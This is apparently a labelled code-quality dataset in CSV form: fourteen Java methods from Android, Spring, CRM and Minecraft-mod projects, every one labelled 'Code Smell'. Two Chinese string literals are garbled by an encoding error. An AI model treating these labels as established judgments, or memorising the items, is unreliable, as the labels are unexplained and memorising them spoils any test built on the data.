text,label,text_label
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if ((""market"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_vipnav"",false)) || (""video"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_videonav"",false)) || (""friend"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_friendnav"",false))|| (""panel"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_panelnav"",false))|| (""find"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_findnav"",false))) {
    ((View)Tab_tabView.get(param.getResult())).setVisibility(View.GONE);
  }
}",1,Code Smell
"@Override public JSONObject queryById(Integer marketingId,String device){
  AES aes=SecureUtil.aes(BYTES);
  CrmMarketing marketing=getById(marketingId);
  Integer subCount=crmMarketingInfoService.lambdaQuery().eq(CrmMarketingInfo::getMarketingId,marketingId).count();
  JSONObject crmMarketing=BeanUtil.copyProperties(marketing,JSONObject.class);
  Integer crmType=marketing.getCrmType();
  if (Arrays.asList(FIXED_CRM_TYPE).contains(crmType)) {
    if (crmType == 1) {
      crmMarketing.put(""crmTypeName"",""绾跨储"");
    }
 else {
      crmMarketing.put(""crmTypeName"",""瀹㈡埛"");
    }
  }
 else {
    CrmMarketingForm marketingForm=crmMarketingFormService.getById(crmType);
    if (marketingForm != null) {
      crmMarketing.put(""crmTypeName"",marketingForm.getTitle());
    }
  }
  crmMarketing.put(""subCount"",subCount);
  crmMarketing.put(""enMarketingId"",aes.encryptHex(marketing.getMarketingId().toString()));
  crmMarketing.put(""currentUserId"",aes.encryptHex(UserUtil.getUserId().toString()));
  crmMarketing.put(""relationUserInfo"",UserCacheUtil.getSimpleUsers(TagUtil.toLongSet(marketing.getRelationUserId())));
  crmMarketing.put(""relationDeptInfo"",adminService.queryDeptByIds(TagUtil.toSet(marketing.getRelationDeptId())).getData());
  crmMarketing.put(""createUserInfo"",UserCacheUtil.getSimpleUser(marketing.getCreateUserId()));
  if (StrUtil.isNotEmpty(marketing.getDetailFileIds())) {
    List<FileEntity> recordList=adminFileService.queryByIds(TagUtil.toLongSet(marketing.getDetailFileIds())).getData();
    crmMarketing.put(""detailFileList"",recordList);
  }
 else {
    crmMarketing.put(""detailFileList"",new ArrayList<>());
  }
  if (marketing.getMainFileIds() != null) {
    List<FileEntity> recordList=adminFileService.queryByIds(TagUtil.toLongSet(marketing.getMainFileIds())).getData();
    crmMarketing.put(""mainFileList"",recordList);
  }
 else {
    crmMarketing.put(""mainFileList"",new ArrayList<>());
  }
  Integer second=marketing.getSecond();
  Integer count=crmMarketingInfoService.lambdaQuery().eq(CrmMarketingInfo::getMarketingId,marketingId).eq(CrmMarketingInfo::getDevice,device).count();
  if (second == 1 && count > 0) {
    crmMarketing.put(""isAdd"",0);
  }
 else {
    crmMarketing.put(""isAdd"",1);
  }
  if (marketing.getStatus() == 0 || System.currentTimeMillis() > marketing.getEndTime().getTime()) {
    crmMarketing.put(""isEnd"",1);
  }
 else {
    crmMarketing.put(""isEnd"",0);
  }
  return crmMarketing;
}",1,Code Smell
"@Override public void onClickSecondaryFab(FabLayout view,FloatingActionButton fab,int position){
  Context context=getEHContext();
  Activity activity=getActivity2();
  EasyRecyclerView recyclerView=mRecyclerView;
  if (null == context || null == activity || null == recyclerView) {
    return;
  }
  if (0 == position) {
    recyclerView.checkAll();
  }
 else {
    List<DownloadInfo> list=mList;
    if (list == null) {
      return;
    }
    LongList gidList=null;
    List<DownloadInfo> downloadInfoList=null;
    boolean collectGid=position == 1 || position == 2 || position == 3;
    boolean collectDownloadInfo=position == 3 || position == 4;
    if (collectGid) {
      gidList=new LongList();
    }
    if (collectDownloadInfo) {
      downloadInfoList=new LinkedList<>();
    }
    SparseBooleanArray stateArray=recyclerView.getCheckedItemPositions();
    for (int i=0, n=stateArray.size(); i < n; i++) {
      if (stateArray.valueAt(i)) {
        DownloadInfo info=list.get(positionInList(stateArray.keyAt(i)));
        if (collectDownloadInfo) {
          downloadInfoList.add(info);
        }
        if (collectGid) {
          gidList.add(info.gid);
        }
      }
    }
switch (position) {
case 1:
{
        Intent intent=new Intent(activity,DownloadService.class);
        intent.setAction(DownloadService.ACTION_START_RANGE);
        intent.putExtra(DownloadService.KEY_GID_LIST,gidList);
        activity.startService(intent);
        recyclerView.outOfCustomChoiceMode();
        break;
      }
case 2:
{
      if (null != mDownloadManager) {
        mDownloadManager.stopRangeDownload(gidList);
      }
      recyclerView.outOfCustomChoiceMode();
      break;
    }
case 3:
{
    CheckBoxDialogBuilder builder=new CheckBoxDialogBuilder(context,getString(R.string.download_remove_dialog_message_2,gidList.size()),getString(R.string.download_remove_dialog_check_text),Settings.getRemoveImageFiles());
    DeleteRangeDialogHelper helper=new DeleteRangeDialogHelper(downloadInfoList,gidList,builder);
    builder.setTitle(R.string.download_remove_dialog_title).setPositiveButton(android.R.string.ok,helper).show();
    break;
  }
case 4:
{
  List<DownloadLabel> labelRawList=EhApplication.getDownloadManager(context).getLabelList();
  List<String> labelList=new ArrayList<>(labelRawList.size() + 1);
  labelList.add(getString(R.string.default_download_label_name));
  for (int i=0, n=labelRawList.size(); i < n; i++) {
    labelList.add(labelRawList.get(i).getLabel());
  }
  String[] labels=labelList.toArray(new String[labelList.size()]);
  MoveDialogHelper helper=new MoveDialogHelper(labels,downloadInfoList);
  new AlertDialog.Builder(context).setTitle(R.string.download_move_dialog_title).setItems(labels,helper).show();
  break;
}
}
}
}",1,Code Smell
"static void testSensitiveApi() throws Exception {
  List<String> words=Arrays.asList(""a"",""b"",""c"");
  IMResult<Void> addResult=SensitiveAdmin.addSensitives(words);
  if (addResult != null && addResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(""Add sensitive word response success"");
  }
 else {
    System.out.println(""Add sensitive word response error"");
    System.exit(-1);
  }
  Thread.sleep(100);
  IMResult<InputOutputSensitiveWords> swResult=SensitiveAdmin.getSensitives();
  if (swResult != null && swResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS && swResult.getResult().getWords().containsAll(words)) {
    System.out.println(""Sensitive word added"");
  }
 else {
    System.out.println(""Sensitive word not added"");
    System.exit(-1);
  }
  IMResult<Void> removeResult=SensitiveAdmin.removeSensitives(words);
  if (removeResult != null && removeResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(""Remove sensitive word response success"");
  }
 else {
    System.out.println(""Remove sensitive word response error"");
    System.exit(-1);
  }
  Thread.sleep(100);
  swResult=SensitiveAdmin.getSensitives();
  if (swResult != null && swResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS && !swResult.getResult().getWords().containsAll(words)) {
    System.out.println(""Sensitive word removed"");
  }
 else {
    System.out.println(""Sensitive word not removed"");
    System.exit(-1);
  }
}",1,Code Smell
"/** 
 * Finds a compatible runtime type if it is more specific
 */
private static Type getRuntimeTypeIfMoreSpecific(Type type,Object value){
  if (value != null && (type == Object.class || type instanceof TypeVariable<?> || type instanceof Class<?>)) {
    type=value.getClass();
  }
  return type;
}
",1,Code Smell
"@Override protected ValueRef getValueRef(ExpressionState state) throws EvaluationException {
  TypedValue context=state.getActiveContextObject();
  Object targetObject=context.getValue();
  TypeDescriptor targetDescriptor=context.getTypeDescriptor();
  TypedValue indexValue=null;
  Object index=null;
  if (targetObject instanceof Map && (this.children[0] instanceof PropertyOrFieldReference)) {
    PropertyOrFieldReference reference=(PropertyOrFieldReference)this.children[0];
    index=reference.getName();
    indexValue=new TypedValue(index);
  }
 else {
    try {
      state.pushActiveContextObject(state.getRootContextObject());
      indexValue=this.children[0].getValueInternal(state);
      index=indexValue.getValue();
    }
  finally {
      state.popActiveContextObject();
    }
  }
  if (targetObject instanceof Map) {
    Object key=index;
    if (targetDescriptor.getMapKeyTypeDescriptor() != null) {
      key=state.convertValue(key,targetDescriptor.getMapKeyTypeDescriptor());
    }
    this.indexedType=IndexedType.MAP;
    return new MapIndexingValueRef(state.getTypeConverter(),(Map<?,?>)targetObject,key,targetDescriptor);
  }
  if (targetObject == null) {
    throw new SpelEvaluationException(getStartPosition(),SpelMessage.CANNOT_INDEX_INTO_NULL_VALUE);
  }
  if (targetObject.getClass().isArray() || targetObject instanceof Collection || targetObject instanceof String) {
    int idx=(Integer)state.convertValue(index,TypeDescriptor.valueOf(Integer.class));
    if (targetObject.getClass().isArray()) {
      this.indexedType=IndexedType.ARRAY;
      return new ArrayIndexingValueRef(state.getTypeConverter(),targetObject,idx,targetDescriptor);
    }
 else     if (targetObject instanceof Collection) {
      if (targetObject instanceof List) {
        this.indexedType=IndexedType.LIST;
      }
      return new CollectionIndexingValueRef((Collection<?>)targetObject,idx,targetDescriptor,state.getTypeConverter(),state.getConfiguration().isAutoGrowCollections(),state.getConfiguration().getMaximumAutoGrowSize());
    }
 else {
      this.indexedType=IndexedType.STRING;
      return new StringIndexingLValue((String)targetObject,idx,targetDescriptor);
    }
  }
  if (String.class == indexValue.getTypeDescriptor().getType()) {
    this.indexedType=IndexedType.OBJECT;
    return new PropertyIndexingValueRef(targetObject,(String)indexValue.getValue(),state.getEvaluationContext(),targetDescriptor);
  }
  throw new SpelEvaluationException(getStartPosition(),SpelMessage.INDEXING_NOT_SUPPORTED_FOR_TYPE,targetDescriptor.toString());
}",1,Code Smell
"/** 
 * update containers in string
 * @param type        container or initContainer
 * @param name
 * @param targetKey
 * @param updateDatas
 * @return
 */
private void updateContainers(String type,String name,String targetKey,JSONArray updateDatas){
  JSONObject workloadSpec=(JSONObject)getWorkloadRef().getSpec();
  log.info(""configmap trait parent workload {}"",workloadSpec.toJSONString());
  JSONArray containers;
  if (workloadSpec.get(""cloneSet"") != null) {
    JSONObject cloneSetSpec=workloadSpec.getJSONObject(""cloneSet"").getJSONObject(""template"").getJSONObject(""spec"");
    containers=cloneSetSpec.getJSONArray(type + ""s"");
  }
 else   if (workloadSpec.get(""advancedStatefulSet"") != null) {
    JSONObject advancedStatefulSetSpec=workloadSpec.getJSONObject(""advancedStatefulSet"").getJSONObject(""template"").getJSONObject(""spec"");
    containers=advancedStatefulSetSpec.getJSONArray(type + ""s"");
  }
 else   if (""Deployment"".equals(workloadSpec.getString(""kind""))) {
    containers=workloadSpec.getJSONArray(type + ""s"");
  }
 else {
    throw new AppException(AppErrorCode.INVALID_USER_ARGS,""not supported"");
  }
  for (int i=0; i < containers.size(); i++) {
    JSONObject container=containers.getJSONObject(i);
    if (!Objects.equals(container.getString(""name""),name)) {
      log.info(""container name not match {} {}"",container.getString(""name""),name);
      continue;
    }
    container.putIfAbsent(targetKey,new JSONArray());
    JSONArray target=container.getJSONArray(targetKey);
    for (int j=0; j < updateDatas.size(); j++) {
      JSONObject updateData=updateDatas.getJSONObject(j);
      log.info(""update container {} {}"",target.toJSONString(),updateData.toJSONString());
      target.add(updateData);
    }
  }
  log.info(""configmap trait parent workload after update {}"",workloadSpec.toJSONString());
}",1,Code Smell
"private String readResponse() throws IOException {
  if (firstRead) {
    try {
      if (!readReadySignal.await(2,TimeUnit.SECONDS)) {
        throw new IOException(""Read thread did not start"");
      }
    }
 catch (    InterruptedException e) {
      throw new IOException(""Read ready await interrupted"");
    }
  }
  try {
    if (!readLock.tryLock((readTimeouts[readTimeoutIndex] * 1000L) + (requestIdCount * PER_REQUEST_READ_TIMEOUT_MILLIS),TimeUnit.MILLISECONDS)) {
      readTimeoutIndex=Math.min(readTimeoutIndex + 1,readTimeouts.length - 1);
      log.warn(""No response from server, setting read timeout to "" + readTimeouts[readTimeoutIndex] + "" secs"");
      throw new IOException(""No response from server"");
    }
  }
 catch (  InterruptedException e) {
    throw new IOException(""Read thread interrupted"");
  }
  if (readTimeoutIndex == readTimeouts.length - 1) {
    readTimeoutIndex--;
  }
  try {
    if (firstRead) {
      readingCondition.signal();
      firstRead=false;
    }
    while (reading) {
      try {
        readingCondition.await();
      }
 catch (      InterruptedException e) {
        Thread.currentThread().interrupt();
        break;
      }
    }
    if (lastException != null) {
      throw new IOException(""Error reading response: "" + lastException.getMessage(),lastException);
    }
    reading=true;
    readingCondition.signal();
    return response;
  }
  finally {
    readLock.unlock();
  }
}",1,Code Smell
"@Inject(method=""clear"",at=@At(""HEAD"")) private void iris$unlockDepthColorState(CallbackInfo ci){
  if (((Object)this) instanceof ExtendedShader || ((Object)this) instanceof FallbackShader || !shouldOverrideShaders()) {
    return;
  }
  DepthColorStorage.unlockDepthColor();
}
",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param){
  if (NextContentAnimationView.isAssignableFrom(param.thisObject.getClass()) || (NextContentAnimationView_short != null && NextContentAnimationView_short.isAssignableFrom(param.args[0].getClass())))   param.args[0]=View.GONE;
}",1,Code Smell
"/** 
 * Check if the path has a relative path
 * @param path
 * @return
 */
public static boolean containsRelativePath(String path){
  if (path.startsWith(""./"") || path.contains(""/./"") || path.startsWith(""../"")|| path.contains(""/../"")) {
    return true;
  }
  if (path.startsWith("".\\"") || path.contains(""\\.\\"") || path.startsWith(""..\\"")|| path.contains(""\\..\\"")) {
    return true;
  }
  return false;
}
",1,Code Smell
"protected void ensureSelectedTabIsVisible(){
  if (tabPane == null || tabViewport == null || !tabPane.isDisplayable())   return;
  ensureCurrentLayout();
  int selectedIndex=tabPane.getSelectedIndex();
  if (selectedIndex < 0 || selectedIndex >= rects.length)   return;
  ((JComponent)tabViewport.getView()).scrollRectToVisible((Rectangle)rects[selectedIndex].clone());
}",1,Code Smell
"protected PaveResult tryFill(MovementContext context,BlockPos targetPos,BlockState toPlace){
  Level level=context.world;
  if (!level.isLoaded(targetPos))   return PaveResult.FAIL;
  BlockState existing=level.getBlockState(targetPos);
  if (existing.is(toPlace.getBlock()))   return PaveResult.PASS;
  if (!existing.is(BlockTags.LEAVES) && !existing.canBeReplaced() && (!existing.getCollisionShape(level,targetPos).isEmpty() || existing.is(BlockTags.PORTALS)))   return PaveResult.FAIL;
  FilterItemStack filter=context.getFilterFromBE();
  ItemStack held=ItemHelper.extract(context.contraption.getSharedInventory(),stack -> filter.test(context.world,stack),1,false);
  if (held.isEmpty())   return PaveResult.FAIL;
  level.setBlockAndUpdate(targetPos,toPlace);
  return PaveResult.SUCCESS;
}",1,Code Smell
"private void recheckScroll(){
  final EmptyRecyclerView.MyLinearLayoutManager layoutMan=(EmptyRecyclerView.MyLinearLayoutManager)mRecyclerView.getLayoutManager();
  assert layoutMan != null;
  int first_visibile_pos=layoutMan.findFirstCompletelyVisibleItemPosition();
  int last_visible_pos=layoutMan.findLastCompletelyVisibleItemPosition();
  int last_pos=mAdapter.getItemCount() - 1;
  boolean reached_bottom=(last_visible_pos >= last_pos);
  boolean is_scrolling=(first_visibile_pos != 0) || (!reached_bottom);
  if (is_scrolling) {
    if (reached_bottom) {
      autoScroll=true;
      showFabDown(false);
    }
 else {
      autoScroll=false;
      showFabDown(true);
    }
  }
 else   showFabDown(false);
}",1,Code Smell
